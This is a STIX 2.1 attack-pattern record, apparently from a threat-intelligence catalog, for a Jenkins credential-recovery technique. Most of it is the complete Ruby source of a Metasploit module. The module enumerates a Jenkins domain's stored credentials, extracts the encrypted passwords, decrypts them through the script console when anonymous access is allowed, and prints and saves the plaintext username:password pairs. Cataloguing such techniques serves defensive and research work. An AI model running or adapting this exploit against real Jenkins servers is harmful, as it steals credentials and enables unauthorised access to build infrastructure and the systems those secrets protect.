{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1bc2761-2dcf-4fb3-b97c-deee4a20de47",
    "created": "2024-08-14T16:31:43.977798Z",
    "modified": "2024-08-14T16:31:43.977801Z",
    "name": "Jenkins Domain Credential Recovery",
    "description": " This module will collect Jenkins domain credentials, and uses the script console to decrypt each password if anonymous permission is allowed.  It has been tested against Jenkins version 1.590, 1.633, and 1.638. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/jenkins_cred_recovery.rb",
            "external_id": "jenkins_cred_recovery.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Jenkins Domain Credential Recovery',\n      'Description'    => %q{\n        This module will collect Jenkins domain credentials, and uses\n        the script console to decrypt each password if anonymous permission\n        is allowed.\n\n        It has been tested against Jenkins version 1.590, 1.633, and 1.638.\n      },\n      'Author'         =>\n        [\n          'Th3R3p0', # Vuln Discovery, PoC\n          'sinn3r'   # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '38664' ],\n          [ 'URL', 'https://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8080\n        },\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',     [true, 'The base path for Jenkins', '/']),\n        OptString.new('JENKINSDOMAIN', [true, 'The domain where we want to extract credentials from', '_'])\n      ])\n  end\n\n\n  # Returns the Jenkins version.\n  #\n  # @return [String] Jenkins version.\n  # @return [NilClass] No Jenkins version found.\n  def get_jenkins_version\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({ 'uri' => uri })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')\n    end\n\n    html = res.get_html_document\n    version_attribute = html.at('body').attributes['data-version']\n    version = version_attribute ? version_attribute.value : ''\n    version.scan(/jenkins\\-([\\d\\.]+)/).flatten.first\n  end\n\n\n  # Returns the Jenkins domain configured by the user.\n  #\n  # @return [String]\n  def domain\n    datastore['JENKINSDOMAIN']\n  end\n\n\n  # Returns a check code indicating the vulnerable status.\n  #\n  # @return [Array] Check code\n  def check\n    version = get_jenkins_version\n    vprint_status(\"Found version: #{version}\")\n\n    # Default version is vulnerable, but can be mitigated by refusing anonymous permission on\n    # decryption API. So a version wouldn't be adequate to check.\n    if version\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Returns all the found Jenkins accounts of a specific domain. The accounts collected only\n  # include the ones with the username-and-password kind. It does not include other kinds such\n  # as SSH, certificates, or other plugins.\n  #\n  # @return [Array<Hash>] An array of account data such as id, username, kind, description, and\n  #                       the domain it belongs to.\n  def get_users\n    users = []\n\n    uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain)\n    uri << '/'\n\n    res = send_request_cgi({ 'uri'=>uri })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while enumerating accounts.')\n    end\n\n    html = res.get_html_document\n    rows = html.search('//table[@class=\"sortable pane bigtable\"]//tr')\n\n    # The first row is the table header, which we don't want.\n    rows.shift\n\n    rows.each do |row|\n      td = row.search('td')\n      id = td[0].at('a').attributes['href'].value.scan(/^credential\\/(.+)/).flatten.first || ''\n      name = td[1].text.scan(/^(.+)\\/\\*+/).flatten.first || ''\n      kind = td[2].text\n      desc = td[3].text\n      next unless /Username with password/i === kind\n\n      users << {\n        id:          id,\n        username:    name,\n        kind:        kind,\n        description: desc,\n        domain:      domain\n      }\n    end\n\n    users\n  end\n\n\n  # Returns the found encrypted password from the update page.\n  #\n  # @param id [String] The ID of a specific account.\n  #\n  # @return [String] Found encrypted password.\n  # @return [NilCass] No encrypted password found.\n  def get_encrypted_password(id)\n    uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain, 'credential', id, 'update')\n    res = send_request_cgi({ 'uri'=>uri })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while getting the encrypted password')\n    end\n\n    html = res.get_html_document\n    input = html.at('//div[@id=\"main-panel\"]//form//table//tr/td//input[@name=\"_.password\"]')\n\n    if input\n      return input.attributes['value'].value\n    else\n      vprint_error(\"Unable to find encrypted password for #{id}\")\n    end\n\n    nil\n  end\n\n\n  # Returns the decrypted password by using the script console.\n  #\n  # @param encrypted_pass [String] The encrypted password.\n  #\n  # @return [String] The decrypted password.\n  # @return [NilClass] No decrypted password found (no result found on the console)\n  def decrypt(encrypted_pass)\n    uri  = normalize_uri(target_uri, 'script')\n    res  = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'vars_post' => {\n        'script' => \"hudson.util.Secret.decrypt '#{encrypted_pass}'\",\n        'json'   => {'script' => \"hudson.util.Secret.decrypt '#{encrypted_pass}'\"}.to_json,\n        'Submit' => 'Run'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while accessing the script console')\n    end\n\n    if /javax\\.servlet\\.ServletException: hudson\\.security\\.AccessDeniedException2/ === res.body\n      vprint_error('No permission to decrypt password')\n      return nil\n    end\n\n    html = res.get_html_document\n    result = html.at('//div[@id=\"main-panel\"]//pre[contains(text(), \"Result:\")]')\n    if result\n      decrypted_password = result.inner_text.scan(/^Result: ([[:print:]]+)/).flatten.first\n      return decrypted_password\n    else\n      vprint_error('Unable to find result')\n    end\n\n    nil\n  end\n\n\n  # Decrypts an encrypted password for a given ID.\n  #\n  # @param id [String] Account ID.\n  #\n  # @return [String] The decrypted password.\n  # @return [NilClass] No decrypted password found (no result found on the console)\n  def descrypt_password(id)\n    encrypted_pass = get_encrypted_password(id)\n    decrypt(encrypted_pass)\n  end\n\n\n  # Reports the username and password to database.\n  #\n  # @param opts [Hash]\n  # @option opts [String] :user\n  # @option opts [String] :password\n  # @option opts [String] :proof\n  #\n  # @return [void]\n  def report_cred(opts)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: ssl ? 'https' : 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user]\n    }.merge(service_data)\n\n    if opts[:password]\n      credential_data.merge!(\n        private_data: opts[:password],\n        private_type: :password\n      )\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  def run\n    users = get_users\n    print_status(\"Found users for domain #{domain}: #{users.length}\")\n\n    users.each do |user_data|\n      pass = descrypt_password(user_data[:id])\n      if pass\n        if user_data[:description].blank?\n          print_good(\"Found credential: #{user_data[:username]}:#{pass}\")\n        else\n          print_good(\"Found credential: #{user_data[:username]}:#{pass} (#{user_data[:description]})\")\n        end\n      else\n        print_status(\"Found #{user_data[:username]}, but unable to decrypt password.\")\n      end\n\n      report_cred(\n        user: user_data[:username],\n        password: pass,\n        proof: user_data.inspect\n      )\n    end\n  end\n\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\nend\n"
}